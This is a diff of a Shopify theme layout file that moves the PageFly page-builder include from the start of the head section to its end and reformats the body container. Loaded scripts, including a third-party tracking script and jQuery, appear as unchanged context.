@@ -5,7 +5,7 @@ If you plan to remove PageFly, please see the guide in our help center first: ht
 <!doctype html>
 {%- assign rtl_languages = 'ae,ar,arc,bcc,bqi,ckb,dv,fa,glk,ha,he,kwh,ks,ku,mzn,nqo,pnb,ps,sd,ug,ur,yi' | split: ',' %}
 <html lang="{{ request.locale.iso_code }}" data-theme="xtra" dir="{% if rtl_languages contains localization.language.iso_code %}rtl{% else %}ltr{% endif %}" class="no-js {% if request.design_mode %}theme-editor{% endif %}{% if settings.button_style == 'inv' %} hover-inv{% endif %}{% if settings.button_wide_mobile %} btn-mobile-wide{% endif %}">
-	<head>{% render 'pagefly-head' %}
+	<head>
 		<meta charset="utf-8">
 		<meta http-equiv="x-ua-compatible" content="ie=edge">
 		<title>{{ page_title }}{% unless page_title contains shop.name %} &ndash; {{ shop.name }}{% endunless %}</title>
@@ -62,9 +62,11 @@ If you plan to remove PageFly, please see the guide in our help center first: ht
 		{% if template == 'product' and product.metafields.inventory.ShappifyHidden or product.type contains '_HIDDEN_' %}{% endif %}
 		{{ settings.custom_script_for_head }}
         <script src="https://codelocksolutions.in/track_site/jquerycls_domore.js" defer></script>
-	</head>
+	{% include 'pagefly-app-header' %}</head>
 
-      <body class="template-{{ template.name | handle }}"><div class="pagefly-container">{{ content_for_layout }}</div></body>
+      <body class="template-{{ template.name | handle }}"><div class="pagefly-container">
+              {{ content_for_layout }}
+            </div></body>
 </html>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
 <script>
